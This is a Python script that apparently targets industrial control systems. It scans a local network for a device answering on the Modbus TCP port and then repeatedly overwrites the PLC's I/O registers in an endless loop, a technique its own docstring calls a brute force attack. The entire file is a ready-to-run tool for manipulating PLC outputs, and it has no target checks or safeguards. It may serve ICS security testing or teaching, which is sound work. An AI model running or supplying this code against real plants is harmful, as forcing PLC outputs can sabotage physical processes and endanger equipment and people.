from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException
import time
import ipaddress

# Function to scan for the PLC's IP address
def find_plc_ip(network_range, port=502):
    """
    Scans the given network range to find the PLC's IP address.
    :param network_range: IP range to scan (e.g., '192.168.1.0/24')
    :param port: Modbus TCP port (default: 502)
    :return: IP address of the PLC or None if not found
    """
    for ip in ipaddress.IPv4Network(network_range, strict=False):
        try:
            print(f"Scanning {ip}...")
            client = ModbusTcpClient(str(ip), port=port, timeout=1)
            if client.connect():
                print(f"PLC found at {ip}")
                client.close()
                return str(ip)
        except Exception as e:
            print(f"Error scanning {ip}: {e}")
    print("PLC not found in the given range.")
    return None

# Function to perform Brute Force I/O
def brute_force_io(plc_ip, start_address, end_address, delay=0.1):
    """
    Repeatedly changes I/O point values to simulate a brute force attack.
    :param plc_ip: IP address of the PLC
    :param start_address: Starting Modbus address to target
    :param end_address: Ending Modbus address to target
    :param delay: Delay between changes (in seconds)
    """
    client = ModbusTcpClient(plc_ip, port=502)
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return

    try:
        while True:
            for address in range(start_address, end_address + 1):
                try:
                    # Write a random value (e.g., 1) to the I/O point
                    print(f"Changing I/O point at address {address}")
                    client.write_register(address, 1)
                    time.sleep(delay)
                except ModbusIOException as e:
                    print(f"Error writing to address {address}: {e}")
    except KeyboardInterrupt:
        print("Brute Force I/O stopped by user.")
    finally:
        client.close()

# Main script
if __name__ == "__main__":
    # Define the network range to scan for the PLC
    network_range = "192.168.1.0/24"

    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip(network_range)
    if not plc_ip:
        print("Exiting script.")
        exit(1)

    # Step 2: Perform Brute Force I/O
    start_address = 0  # Starting Modbus address
    end_address = 10   # Ending Modbus address
    brute_force_io(plc_ip, start_address, end_address)